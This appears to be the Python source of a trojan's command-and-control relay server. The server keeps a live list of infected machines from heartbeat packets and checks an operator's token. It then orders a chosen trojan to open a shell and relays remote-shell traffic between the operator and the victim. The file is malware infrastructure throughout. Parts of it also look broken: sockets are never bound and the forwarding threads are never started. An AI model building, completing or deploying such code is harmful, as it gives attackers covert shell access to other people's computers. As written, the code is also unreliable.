from socket import socket, gethostname, gethostbyname, AF_INET, SOCK_STREAM, SOCK_DGRAM
from multiprocessing import Process, Value
from threading import Thread
from time import sleep
from logging import getLogger
import logging_config


logger = getLogger(__name__)


class Server:
    def __init__(self,
                 token: str,
                 client_shell_port: int,
                 client_communication_port: int,
                 trojan_shell_port: int,
                 trojan_communication_port: int,
                 heartbeat_port: int
                 ):
        self.token = token.encode()
        self.ports = {
            'client_shell': client_shell_port,
            'client_communication': client_communication_port,
            'trojan_shell': trojan_shell_port,
            'trojan_communication': trojan_communication_port,
            'heartbeat': heartbeat_port
        }

        logger.info(
                f'Server set up:\n'
                f'\tip: {gethostbyname(gethostname())}\n'
                f'\tports:\n'
                f'\t\tclient_shell: {client_shell_port}\n'
                f'\t\tclient_communication: {client_communication_port}\n'
                f'\t\ttrojan_shell: {trojan_shell_port}\n'
                f'\t\ttrojan_communication: {trojan_communication_port}\n'
                f'\t\theartbeat: {heartbeat_port}'
        )
        self.alive_trojans = {}

    def run(self):
        self._update_alive_list()
        client_communication_socket = socket(AF_INET, SOCK_DGRAM)
        client_communication_socket.bind(('', self.ports['client_communication']))
        logger.info('Client communication socket set.')

        while True:
            b_msg, address = client_communication_socket.recvfrom(1024)
            logger.debug(b_msg)
            if b_msg == self.token:
                client_communication_socket.sendto('ROOKIES:'.encode(), address)
                for i in self.alive_trojans.keys():
                    client_communication_socket.sendto(f'{i}'.encode(), address)

                name = client_communication_socket.recvfrom(1024)[0].decode()
                logger.debug(name)
                if name in self.alive_trojans.keys():
                    client_communication_socket.sendto(f'Redirecting to {name} ...'.encode(), address)
                    client_communication_socket.close()
                    ip = self.alive_trojans[name]['ip']
                    interrupt = Value('b', 0)
                    proc = Process(target=_exchange, args=(ip, self.ports, interrupt))
                    proc.start()
                    while interrupt.value == 0:
                        pass
                    proc.kill()
                else:
                    client_communication_socket.sendto(f'Can\'t find {name}, try again.'.encode(), address)

    def _update_alive_list(self):
        heartbeat_socket = socket(AF_INET, SOCK_DGRAM)
        heartbeat_socket.bind(('', self.ports['heartbeat']))

        def sup1():
            while True:
                b_name, address = heartbeat_socket.recvfrom(1024)
                name = b_name.decode()
                ip = address[0]
                self.alive_trojans[name] = {
                    'ip': ip,
                    'lifetime': 5,
                }

        def sup2():
            while True:
                for name, i in self.alive_trojans.items():
                    if i['lifetime'] == 0:
                        del self.alive_trojans[name]
                    else:
                        i['lifetime'] -= 1
                sleep(1)

        Thread(target=sup1).start()
        Thread(target=sup2).start()


def _exchange(trojan_ip: str, ports: dict, interrupt: Value):
    interrupt = interrupt
    interrupt.value = 0
    temp_client_shell_socket = socket(AF_INET, SOCK_STREAM)
    client_shell_socket = None
    client_communication_socket = socket(AF_INET, SOCK_DGRAM)
    temp_trojan_shell_socket = socket(AF_INET, SOCK_STREAM)
    trojan_shell_socket = None
    trojan_communication_socket = socket(AF_INET, SOCK_DGRAM)

    client_communication_socket.bind(('', ports['client_communication']))
    trojan_communication_socket.bind(('', ports['trojan_communication']))
    trojan_communication_socket.sendto('shell'.encode(), (trojan_ip, ports['trojan_communication']))

    Thread(target=temp_client_shell_socket.listen).start()
    Thread(target=temp_trojan_shell_socket.listen).start()
    max_waiting_time = 5
    all_accepted = False

    def wait_connection():
        nonlocal max_waiting_time
        nonlocal all_accepted
        sleep(max_waiting_time)
        if not all_accepted:
            interrupt.value = 1
            logger.debug('timeout')

    Thread(target=wait_connection).start()
    while not all_accepted:
        try:
            if client_shell_socket is None:
                client_shell_socket = temp_client_shell_socket.accept()
                logger.debug('client accepted')
            elif trojan_shell_socket is None:
                trojan_shell_socket = temp_trojan_shell_socket.accept()
                logger.debug('trojan accepted')
            else:
                all_accepted = True
        except OSError:
            pass

    def forward(sender: socket, receiver: socket):
        try:
            while True:
                data = sender.recv(1024)
                receiver.sendall(data)
        except ConnectionError:
            interrupt.value = 1

    Thread(target=forward, args=(client_shell_socket, trojan_shell_socket))
    Thread(target=forward, args=(trojan_shell_socket, client_shell_socket))
    Thread(target=forward, args=(client_communication_socket, trojan_communication_socket))
    Thread(target=forward, args=(trojan_communication_socket, client_communication_socket))


